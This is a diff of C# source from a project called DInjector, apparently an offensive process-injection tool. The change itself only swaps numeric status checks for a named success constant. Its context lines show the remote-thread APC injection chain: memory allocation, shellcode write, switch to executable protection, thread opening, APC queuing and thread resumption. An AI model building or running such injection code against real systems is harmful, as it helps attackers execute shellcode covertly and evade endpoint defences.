@@ -2,6 +2,7 @@
 using System.Runtime.InteropServices;
 
 using DI = DInvoke;
+using static DInvoke.Data.Native;
 
 namespace DInjector
 {
@@ -34,7 +35,7 @@ namespace DInjector
                 DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadAPC) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             else
                 Console.WriteLine($"(RemoteThreadAPC) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
@@ -55,7 +56,7 @@ namespace DInjector
                 (uint)shellcode.Length,
                 ref bytesWritten);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadAPC) [+] NtWriteVirtualMemory");
             else
                 Console.WriteLine($"(RemoteThreadAPC) [-] NtWriteVirtualMemory: {ntstatus}");
@@ -75,7 +76,7 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                 ref oldProtect);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadAPC) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
             else
                 Console.WriteLine($"(RemoteThreadAPC) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
@@ -94,7 +95,7 @@ namespace DInjector
                 ref oa,
                 ref ci);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadAPC) [+] NtOpenThread");
             else
                 Console.WriteLine($"(RemoteThreadAPC) [-] NtOpenThread: {ntstatus}");
@@ -110,7 +111,7 @@ namespace DInjector
                 IntPtr.Zero,
                 IntPtr.Zero);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadAPC) [+] NtQueueApcThread");
             else
                 Console.WriteLine($"(RemoteThreadAPC) [-] NtQueueApcThread: {ntstatus}");
@@ -125,7 +126,7 @@ namespace DInjector
                 pi.hThread,
                 ref suspendCount);
 
-            if (ntstatus == 0)
+            if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadAPC) [+] NtAlertResumeThread");
             else
                 Console.WriteLine($"(RemoteThreadAPC) [-] NtAlertResumeThread: {ntstatus}");
